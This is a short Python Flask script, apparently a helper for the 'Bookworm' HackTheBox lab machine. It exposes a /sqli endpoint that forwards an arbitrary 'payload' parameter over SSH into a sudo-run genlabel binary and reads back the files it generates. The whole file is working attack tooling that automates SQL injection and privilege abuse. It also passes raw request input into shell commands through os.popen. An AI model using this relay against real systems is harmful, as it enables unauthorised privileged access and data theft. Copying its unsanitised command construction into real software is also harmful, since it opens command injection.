#!/usr/bin/python3

from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/sqli')
def sqli():
    ssh = 'sshpass ssh neil@bookworm.htb'
    cmd_out = os.popen(f"{ssh} -C \"sudo /usr/local/bin/genlabel '{request.args['payload']}'\"").read()
    if '/tmp/' in cmd_out:
        return os.popen(f"{ssh} -C \"cat '{cmd_out[-25:].strip()}/output.ps'\"").read()
    else:
        return cmd_out

if __name__ == '__main__':
    app.run(debug=True, port=1337)
